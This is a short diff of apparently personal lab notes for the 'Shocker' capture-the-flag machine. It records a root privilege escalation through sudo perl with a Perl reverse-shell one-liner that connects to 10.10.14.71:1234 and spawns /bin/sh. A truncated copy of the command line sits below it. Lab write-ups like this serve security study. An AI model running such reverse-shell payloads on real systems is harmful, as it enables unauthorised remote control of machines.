@@ -8,4 +8,5 @@ Command used for privilege escalation to root.
 shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.71";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 <TDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
-## Got revers
+## Got reverse shell as root
+![[Pasted image 20210705103812.png]]
